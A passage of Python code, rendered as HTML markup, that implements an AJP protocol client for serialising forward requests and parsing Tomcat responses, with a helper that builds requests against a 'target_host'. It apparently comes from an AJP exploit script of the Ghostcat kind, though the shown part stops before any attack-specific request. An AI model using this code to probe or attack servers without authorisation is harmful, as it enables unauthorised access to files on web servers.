struct.pack(&quot;&gt;h&quot;, self.num_headers)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for h_name in self.request_headers:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if h_name.startswith(&quot;SC_REQ&quot;):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;code = AjpForwardRequest.COMMON_HEADERS.index(h_name) + 1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res += struct.pack(&quot;BB&quot;, 0xA0, code)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res += pack_string(h_name)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res += pack_string(self.request_headers[h_name])</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return res</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;def pack_attributes(self):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res = b&quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for attr in self.attributes:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;a_name = attr[&#39;name&#39;]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;code = AjpForwardRequest.ATTRIBUTES.index(a_name) + 1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res += struct.pack(&quot;b&quot;, code)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if a_name == &quot;req_attribute&quot;:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;aa_name, a_value = attr[&#39;value&#39;]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res += pack_string(aa_name)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res += pack_string(a_value)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res += pack_string(attr[&#39;value&#39;])</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res += struct.pack(&quot;B&quot;, 0xFF)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return res</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;def serialize(self):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res = &quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res = struct.pack(&quot;bb&quot;, self.prefix_code, self.method)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res += pack_string(self.protocol)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res += pack_string(self.req_uri)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res += pack_string(self.remote_addr)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res += pack_string(self.remote_host)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res += pack_string(self.server_name)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res += struct.pack(&quot;&gt;h&quot;, self.server_port)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res += struct.pack(&quot;?&quot;, self.is_ssl)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res += self.pack_headers()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res += self.pack_attributes()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if self.data_direction == AjpForwardRequest.SERVER_TO_CONTAINER:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;header = struct.pack(&quot;&gt;bbh&quot;, 0x12, 0x34, len(res))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;header = struct.pack(&quot;&gt;bbh&quot;, 0x41, 0x42, len(res))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return header + res</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;def parse(self, raw_packet):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;stream = StringIO(raw_packet)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.magic1, self.magic2, data_len = unpack(stream, &quot;bbH&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.prefix_code, self.method = unpack(stream, &quot;bb&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.protocol = unpack_string(stream)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.req_uri = unpack_string(stream)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.remote_addr = unpack_string(stream)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.remote_host = unpack_string(stream)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.server_name = unpack_string(stream)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.server_port = unpack(stream, &quot;&gt;h&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.is_ssl = unpack(stream, &quot;?&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.num_headers, = unpack(stream, &quot;&gt;H&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.request_headers = {}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for i in range(self.num_headers):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;code, = unpack(stream, &quot;&gt;H&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if code &gt; 0xA000:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;h_name = AjpForwardRequest.COMMON_HEADERS[code - 0xA001]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;h_name = unpack(stream, &quot;%ds&quot; % code)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;stream.read(1) &nbsp;# \0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;h_value = unpack_string(stream)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.request_headers[h_name] = h_value</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;def send_and_receive(self, socket, stream, save_cookies=False):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res = []</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;i = socket.sendall(self.serialize())</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if self.method == AjpForwardRequest.POST:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return res</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r = AjpResponse.receive(stream)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;assert r.prefix_code == AjpResponse.SEND_HEADERS</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res.append(r)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if save_cookies and &#39;Set-Cookie&#39; in r.response_headers:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.headers[&#39;SC_REQ_COOKIE&#39;] = r.response_headers[&#39;Set-Cookie&#39;]</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# read body chunks and end response packets</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while True:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r = AjpResponse.receive(stream)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res.append(r)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if r.prefix_code == AjpResponse.END_RESPONSE:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;elif r.prefix_code == AjpResponse.SEND_BODY_CHUNK:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;raise NotImplementedError</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return res</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">class AjpResponse(object):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;_, _, _, SEND_BODY_CHUNK, SEND_HEADERS, END_RESPONSE, GET_BODY_CHUNK = range(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;7)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;COMMON_SEND_HEADERS = [</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;Content-Type&quot;, &quot;Content-Language&quot;, &quot;Content-Length&quot;, &quot;Date&quot;, &quot;Last-Modified&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;Location&quot;, &quot;Set-Cookie&quot;, &quot;Set-Cookie2&quot;, &quot;Servlet-Engine&quot;, &quot;Status&quot;, &quot;WWW-Authenticate&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;]</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;def parse(self, stream):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# read headers</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.magic, self.data_length, self.prefix_code = unpack(stream, &quot;&gt;HHb&quot;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if self.prefix_code == AjpResponse.SEND_HEADERS:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.parse_send_headers(stream)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;elif self.prefix_code == AjpResponse.SEND_BODY_CHUNK:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.parse_send_body_chunk(stream)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;elif self.prefix_code == AjpResponse.END_RESPONSE:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.parse_end_response(stream)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;elif self.prefix_code == AjpResponse.GET_BODY_CHUNK:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.parse_get_body_chunk(stream)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;raise NotImplementedError</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;def parse_send_headers(self, stream):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.http_status_code, = unpack(stream, &quot;&gt;H&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.http_status_msg = unpack_string(stream)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.num_headers, = unpack(stream, &quot;&gt;H&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.response_headers = {}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for i in range(self.num_headers):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;code, = unpack(stream, &quot;&gt;H&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if code &lt;= 0xA000: &nbsp;# custom header</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;h_name, = unpack(stream, &quot;%ds&quot; % code)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;stream.read(1) &nbsp;# \0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;h_value = unpack_string(stream)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;h_name = AjpResponse.COMMON_SEND_HEADERS[code-0xA001]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;h_value = unpack_string(stream)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.response_headers[h_name] = h_value</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;def parse_send_body_chunk(self, stream):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.data_length, = unpack(stream, &quot;&gt;H&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.data = stream.read(self.data_length+1)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;def parse_end_response(self, stream):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.reuse, = unpack(stream, &quot;b&quot;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;def parse_get_body_chunk(self, stream):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rlen, = unpack(stream, &quot;&gt;H&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return rlen</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;@staticmethod</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;def receive(stream):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r = AjpResponse()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r.parse(stream)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return r</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fr.method = method</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fr.protocol = &quot;HTTP/1.1&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fr.req_uri = req_uri</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fr.remote_addr = target_host</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fr.remote_host = None</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fr.server_name = target_host</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fr.server_port = 80</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fr.request_headers = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;SC_REQ_ACCEPT&#39;: &#39;text/html&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;SC_REQ_CONNECTION&#39;: &#39;keep-alive&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;SC_REQ_CONTENT_LENGTH&#39;: &#39;0&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;SC_REQ_HOST&#39;: target_host,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;SC_REQ_USER_AGENT&#39;: &#39;Mozilla&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Accept-Encoding&#39;: &#39;gzip, deflate, sdch&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Accept-Language&#39;: &#39;en-US,en;q=0.5&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Upgrade-Insecure-Requests&#39;: &#39;1&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Cache-Control&#39;: &#39;max-age=0&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fr.is_ssl = False</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fr.attributes = []</span><span class="cs8926E06"><br/></span><span 